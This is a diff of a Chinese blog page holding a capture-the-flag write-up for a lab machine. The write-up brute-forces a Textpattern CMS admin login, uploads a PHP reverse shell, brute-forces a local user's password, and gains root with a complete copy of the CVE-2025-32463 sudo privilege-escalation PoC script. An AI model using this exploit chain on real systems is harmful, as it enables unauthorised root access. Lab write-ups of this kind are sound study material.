@@ -910,9 +910,19 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
-
+<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>
 
 
 
@@ -942,14 +952,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><p><img src="https://7r1umphk.github.io/image/20250715211044343.webp" alt="image-20250715211044032" /></p>
+<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c6c1e603e1905b31a1c7538dd97e73f2abf4747ebb789d612979a1a45039013c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313034343334332e77656270"><img src="https://camo.githubusercontent.com/c6c1e603e1905b31a1c7538dd97e73f2abf4747ebb789d612979a1a45039013c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313034343334332e77656270" alt="image-20250715211044032" data-canonical-src="https://7r1umphk.github.io/image/20250715211044343.webp" style="max-width: 100%;"></a></p>
 <p>这个打完了，补个wp</p>
-<blockquote>
-<p>[!Tip]</p>
-<p>群里搞了一个我们自己靶机的wp仓库，感兴趣的可以看一下
+<div class="markdown-alert markdown-alert-tip"><p class="markdown-alert-title"><svg class="octicon octicon-light-bulb mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>Tip</p>
+<p>群里搞了一个我们自己靶机的wp仓库，感兴趣的可以看一下<br>
 <a href="https://github.com/hyhforevertop/Mazesec-writeups">https://github.com/hyhforevertop/Mazesec-writeups</a></p>
-</blockquote>
-<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+</div>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l                                       
 [sudo] kali 的密码：
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
@@ -965,7 +974,7 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 1.954 seconds (131.01 hosts/sec). 4
 </code></pre>
 <p>192.168.205.185</p>
 <p>探测服务</p>
-<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p- 192.168.205.185  
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 09:11 EDT
 Nmap scan report for 192.168.205.185
@@ -980,10 +989,10 @@ Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
                                                                        
 </code></pre>
 <p>看web</p>
-<p><img src="https://7r1umphk.github.io/image/20250715211202294.webp" alt="image-20250715211201958" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/317ecc2424fe3ef2c7778a3640dc36a20c4f8c56b513194a41de504c977ada12/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313230323239342e77656270"><img src="https://camo.githubusercontent.com/317ecc2424fe3ef2c7778a3640dc36a20c4f8c56b513194a41de504c977ada12/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313230323239342e77656270" alt="image-20250715211201958" data-canonical-src="https://7r1umphk.github.io/image/20250715211202294.webp" style="max-width: 100%;"></a></p>
 <p>随便点个超链接发现跳转textpattern.dsz</p>
 <p>加个hosts</p>
-<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo vim /etc/hosts                                                                            
                                                                                                                                                                                   
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
@@ -991,9 +1000,9 @@ Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
 192.168.205.185 textpattern.dsz
                               
 </code></pre>
-<p><img src="https://7r1umphk.github.io/image/20250715211441521.webp" alt="image-20250715211441278" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fdce1319407324863d5bd6eb109e31f2447f981e812ed48dede05287e91949ce/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313434313532312e77656270"><img src="https://camo.githubusercontent.com/fdce1319407324863d5bd6eb109e31f2447f981e812ed48dede05287e91949ce/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313434313532312e77656270" alt="image-20250715211441278" data-canonical-src="https://7r1umphk.github.io/image/20250715211441521.webp" style="max-width: 100%;"></a></p>
 <p>目录爆破</p>
-<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ gobuster dir -u http://textpattern.dsz/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
 ===============================================================
 Gobuster v3.6
@@ -1030,7 +1039,7 @@ Finished
 ===============================================================
 </code></pre>
 <p>扒拉了一下，在README.txt看到了cms的版本号</p>
-<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://textpattern.dsz/README.txt                          
 Textpattern CMS 4.8.7
 
@@ -1076,31 +1085,31 @@ system. Textpattern is free and open source.
 * Donate:        https://textpattern.com/about/patrons
                                                   
 </code></pre>
-<p>Textpattern CMS 4.8.7，google了一下，看到了一个远程命令执行和上传漏洞，所以还是需要爆破一下用户密码
-<img src="https://7r1umphk.github.io/image/20250715211701938.webp" alt="image-20250715211701681" /></p>
-<p>点这里会跳转登录或者访问    <a href="http://textpattern.dsz/textpattern/">http://textpattern.dsz/textpattern/</a></p>
+<p>Textpattern CMS 4.8.7，google了一下，看到了一个远程命令执行和上传漏洞，所以还是需要爆破一下用户密码<br>
+<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d6172a76ba1f2c98ab1891935e8557313d92b6c2581bbf3b9d991db9a63a411e/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313730313933382e77656270"><img src="https://camo.githubusercontent.com/d6172a76ba1f2c98ab1891935e8557313d92b6c2581bbf3b9d991db9a63a411e/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313730313933382e77656270" alt="image-20250715211701681" data-canonical-src="https://7r1umphk.github.io/image/20250715211701938.webp" style="max-width: 100%;"></a></p>
+<p>点这里会跳转登录或者访问    <a href="http://textpattern.dsz/textpattern/" rel="nofollow">http://textpattern.dsz/textpattern/</a></p>
 <p>随便输入点抓包</p>
-<p><img src="https://7r1umphk.github.io/image/20250715211819190.webp" alt="image-20250715211818852" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/68b605b1d14085fe480b7f39c3630f586f914e6c7cd306718b0c9506cd6200ff/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313831393139302e77656270"><img src="https://camo.githubusercontent.com/68b605b1d14085fe480b7f39c3630f586f914e6c7cd306718b0c9506cd6200ff/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231313831393139302e77656270" alt="image-20250715211818852" data-canonical-src="https://7r1umphk.github.io/image/20250715211819190.webp" style="max-width: 100%;"></a></p>
 <p>只可以硬爆，巨慢</p>
-<p><img src="https://7r1umphk.github.io/image/20250715212037141.webp" alt="image-20250715212036753" /></p>
-<p><img src="https://7r1umphk.github.io/image/20250715212123818.webp" alt="image-20250715212123475" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f8f7089b2fa57e1ea8a0da9fa84e743b8e3f43be97615192ae4e93066b6c82e6/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323033373134312e77656270"><img src="https://camo.githubusercontent.com/f8f7089b2fa57e1ea8a0da9fa84e743b8e3f43be97615192ae4e93066b6c82e6/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323033373134312e77656270" alt="image-20250715212036753" data-canonical-src="https://7r1umphk.github.io/image/20250715212037141.webp" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/784fd830b4fe7407227f029cac5e9907214c9683d7fc0bdaffc58e193a527a46/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323132333831382e77656270"><img src="https://camo.githubusercontent.com/784fd830b4fe7407227f029cac5e9907214c9683d7fc0bdaffc58e193a527a46/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323132333831382e77656270" alt="image-20250715212123475" data-canonical-src="https://7r1umphk.github.io/image/20250715212123818.webp" style="max-width: 100%;"></a></p>
 <p>密码就rockyou.txt，不截图了</p>
 <p>然后开启，等就好了</p>
-<p><img src="https://7r1umphk.github.io/image/20250715212254743.webp" alt="image-20250715212254371" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f0a6b3b406647669ea33cf5c82181e35f19939a198dfe2c353d87bcbf7ed461d/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323235343734332e77656270"><img src="https://camo.githubusercontent.com/f0a6b3b406647669ea33cf5c82181e35f19939a198dfe2c353d87bcbf7ed461d/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323235343734332e77656270" alt="image-20250715212254371" data-canonical-src="https://7r1umphk.github.io/image/20250715212254743.webp" style="max-width: 100%;"></a></p>
 <p>admin:superman</p>
-<p><img src="https://7r1umphk.github.io/image/20250715212344398.webp" alt="image-20250715212344044" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/916e7bc9b7dc6f4f5a06d0160808a64f6ba06b7a732da0ebe3222a46ca1df1a7/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323334343339382e77656270"><img src="https://camo.githubusercontent.com/916e7bc9b7dc6f4f5a06d0160808a64f6ba06b7a732da0ebe3222a46ca1df1a7/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323334343339382e77656270" alt="image-20250715212344044" data-canonical-src="https://7r1umphk.github.io/image/20250715212344398.webp" style="max-width: 100%;"></a></p>
 <p>上传一个reverse.php上去就好了</p>
 <p>kali监听</p>
-<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888           
 listening on [any] 8888 ...
 </code></pre>
-<p><img src="https://7r1umphk.github.io/image/20250715212430750.webp" alt="image-20250715212430424" /></p>
-<p>去<a href="http://textpattern.dsz/files/">http://textpattern.dsz/files/</a></p>
-<p><img src="https://7r1umphk.github.io/image/20250715212455203.webp" alt="image-20250715212454872" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/725648deb275bf98406ae8291e950628b89e69c5728a9b499f6bed8a5841df8f/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323433303735302e77656270"><img src="https://camo.githubusercontent.com/725648deb275bf98406ae8291e950628b89e69c5728a9b499f6bed8a5841df8f/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323433303735302e77656270" alt="image-20250715212430424" data-canonical-src="https://7r1umphk.github.io/image/20250715212430750.webp" style="max-width: 100%;"></a></p>
+<p>去<a href="http://textpattern.dsz/files/" rel="nofollow">http://textpattern.dsz/files/</a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4dc0ca5cbbdbe93691e0aea1b22a3b6d8fa41ed127f08b2b3d3f492aa9e58318/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323435353230332e77656270"><img src="https://camo.githubusercontent.com/4dc0ca5cbbdbe93691e0aea1b22a3b6d8fa41ed127f08b2b3d3f492aa9e58318/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323435353230332e77656270" alt="image-20250715212454872" data-canonical-src="https://7r1umphk.github.io/image/20250715212455203.webp" style="max-width: 100%;"></a></p>
 <p>点击，转圈圈</p>
 <p>回去看监听</p>
-<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888           
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 38534
@@ -1144,12 +1153,12 @@ find / -perm -4000 -type f 2&gt;/dev/null
 <p>/usr/bin/sudo</p>
 <p>/usr/local/bin/sudo</p>
 <p>对比一下</p>
-<pre><code>www-data@5ud0:/$ diff /usr/bin/sudo /usr/local/bin/sudo
+<pre class="notranslate"><code class="notranslate">www-data@5ud0:/$ diff /usr/bin/sudo /usr/local/bin/sudo
 diff /usr/bin/sudo /usr/local/bin/sudo
 Binary files /usr/bin/sudo and /usr/local/bin/sudo differ
 </code></pre>
 <p>而且这个靶机名字就叫5ud0，所以很怀疑</p>
-<pre><code>www-data@5ud0:/$ /usr/bin/sudo -V
+<pre class="notranslate"><code class="notranslate">www-data@5ud0:/$ /usr/bin/sudo -V
 /usr/bin/sudo -V
 Sudo version 1.9.16p2
 Sudoers policy plugin version 1.9.16p2
@@ -1165,11 +1174,11 @@ Sudoers I/O plugin version 1.9.6
 Sudoers audit plugin version 1.9.6
 </code></pre>
 <p>/usr/local/bin/sudo是比较新的版本，/usr/bin/sudo是1.9.16p2的，这个版本好像前端时间爆出了一个漏洞，google一下</p>
-<p><img src="https://7r1umphk.github.io/image/20250715212901701.webp" alt="image-20250715212901470" /></p>
-<p>群里前段时间也提了一下，不过我们现在需要先<del>拿个知道密码的用户，www-data的密码我可不知道</del> （纯小丑，CVE-2025-32463不需要密码就可以利用）</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fd5a65e4726d4db0f51ccd96a2df5cfe66b68fdca88e7379c3e40abb3c233d78/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323930313730312e77656270"><img src="https://camo.githubusercontent.com/fd5a65e4726d4db0f51ccd96a2df5cfe66b68fdca88e7379c3e40abb3c233d78/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231323930313730312e77656270" alt="image-20250715212901470" data-canonical-src="https://7r1umphk.github.io/image/20250715212901701.webp" style="max-width: 100%;"></a></p>
+<p>群里前段时间也提了一下，不过我们现在需要先<del>拿个知道密码的用户，www-data的密码我可不知道</del> （纯小丑，<a title="CVE-2025-32463" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-695j-c63m-mvxc/hovercard" href="https://github.com/advisories/GHSA-695j-c63m-mvxc">CVE-2025-32463</a>不需要密码就可以利用）</p>
 <p>todd没有找到什么有意思的东西，那爆破密码吧</p>
 <p>先稳定一下shell</p>
-<pre><code>script /dev/null -c bash
+<pre class="notranslate"><code class="notranslate">script /dev/null -c bash
 Ctrl+Z
 stty raw -echo; fg
 reset xterm  
@@ -1177,7 +1186,7 @@ export TERM=xterm
 export SHELL=/bin/bash  
 stty rows 24 columns 80
 </code></pre>
-<pre><code>www-data@5ud0:/tmp$ busybox wget 192.168.205.128/rockyou.txt
+<pre class="notranslate"><code class="notranslate">www-data@5ud0:/tmp$ busybox wget 192.168.205.128/rockyou.txt
 Connecting to 192.168.205.128 (192.168.205.128:80)
 rockyou.txt          100% |********************************|  133M  0:00:00 ETA
 www-data@5ud0:/tmp$ busybox wget 192.168.205.128/suForce
@@ -1210,7 +1219,7 @@ www-data@5ud0:/tmp$ ./suForce
 
 </code></pre>
 <p>我这偷个鸡，我知道是9000行左右的，我提取1w行，然后从后往前爆破</p>
-<pre><code>www-data@5ud0:/tmp$ head -n 10000 rockyou.txt |tac &gt; passwd.txt
+<pre class="notranslate"><code class="notranslate">www-data@5ud0:/tmp$ head -n 10000 rockyou.txt |tac &gt; passwd.txt
 www-data@5ud0:/tmp$ ls -al passwd.txt 
 -rw-rw-rw- 1 www-data www-data 80577 Jul 15 09:41 passwd.txt
 www-data@5ud0:/tmp$ ./suForce -u todd -w passwd.txt 
@@ -1230,14 +1239,14 @@ www-data@5ud0:/tmp$ ./suForce -u todd -w passwd.txt
 
 </code></pre>
 <p>登上去</p>
-<pre><code>www-data@5ud0:/tmp$ su todd
+<pre class="notranslate"><code class="notranslate">www-data@5ud0:/tmp$ su todd
 Password: 
 todd@5ud0:/tmp$ id
 uid=1000(todd) gid=1000(todd) groups=1000(todd)
 </code></pre>
 <p><a href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot">https://github.com/pr0v3rbs/CVE-2025-32463_chwoot</a></p>
 <p>漏洞poc</p>
-<pre><code>#!/bin/bash
+<pre class="notranslate"><code class="notranslate">#!/bin/bash
 # sudo-chwoot.sh
 # CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
 #                  @ Stratascale Cyber Research Unit (CRU)
@@ -1246,15 +1255,15 @@ cd ${STAGE?} || exit 1
 
 if [ $# -eq 0 ]; then
     # If no command is provided, default to an interactive root shell.
-    CMD=&quot;/bin/bash&quot;
+    CMD="/bin/bash"
 else
     # Otherwise, use the provided arguments as the command to execute.
-    CMD=&quot;$@&quot;
+    CMD="$@"
 fi
 
 # Escape the command to safely include it in a C string literal.
 # This handles backslashes and double quotes.
-CMD_C_ESCAPED=$(printf '%s' &quot;$CMD&quot; | sed -e 's/\\/\\\\/g' -e 's/&quot;/\\&quot;/g')
+CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')
 
 cat &gt; woot1337.c&lt;&lt;EOF
 #include &lt;stdlib.h&gt;
@@ -1263,22 +1272,22 @@ cat &gt; woot1337.c&lt;&lt;EOF
 __attribute__((constructor)) void woot(void) {
   setreuid(0,0);
   setregid(0,0);
-  chdir(&quot;/&quot;);
-  execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;${CMD_C_ESCAPED}&quot;, NULL);
+  chdir("/");
+  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
 }
 EOF
 
 mkdir -p woot/etc libnss_
-echo &quot;passwd: /woot1337&quot; &gt; woot/etc/nsswitch.conf
+echo "passwd: /woot1337" &gt; woot/etc/nsswitch.conf
 cp /etc/group woot/etc
 gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
 
-echo &quot;woot!&quot;
+echo "woot!"
 sudo -R woot woot
 rm -rf ${STAGE?}
 </code></pre>
 <p>直接复制进去，不想下载了</p>
-<pre><code>todd@5ud0:/tmp$ vim a.sh
+<pre class="notranslate"><code class="notranslate">todd@5ud0:/tmp$ vim a.sh
 todd@5ud0:/tmp$ head -n 5 a.sh 
 #!/bin/bash
 # sudo-chwoot.sh
@@ -1287,9 +1296,9 @@ todd@5ud0:/tmp$ head -n 5 a.sh
 STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
 </code></pre>
 <p>改点东西</p>
-<p><img src="https://7r1umphk.github.io/image/20250715214543644.webp" alt="image-20250715214543419" /></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2e249b298f3255dff41b058a4cd44d515e1a02310d5f61d0ede1adf6f0d324f2/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231343534333634342e77656270"><img src="https://camo.githubusercontent.com/2e249b298f3255dff41b058a4cd44d515e1a02310d5f61d0ede1adf6f0d324f2/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303731353231343534333634342e77656270" alt="image-20250715214543419" data-canonical-src="https://7r1umphk.github.io/image/20250715214543644.webp" style="max-width: 100%;"></a></p>
 <p>改成有漏洞的</p>
-<pre><code>todd@5ud0:/tmp$ bash a.sh 
+<pre class="notranslate"><code class="notranslate">todd@5ud0:/tmp$ bash a.sh 
 woot!
 [sudo] password for todd: 
 root@5ud0:/# id
@@ -1297,8 +1306,7 @@ uid=0(root) gid=0(root) groups=0(root),1000(todd)
 root@5ud0:/# cat /root/root.txt /home/todd/user.txt 
 flag{root-257f425d-1ea4-4b8e-8dd8-69523f25d249}
 flag{user-80e68759-1ca0-45eb-82a7-601b1f78dfe5}
-</code></pre>
-</div>
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -1323,7 +1331,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 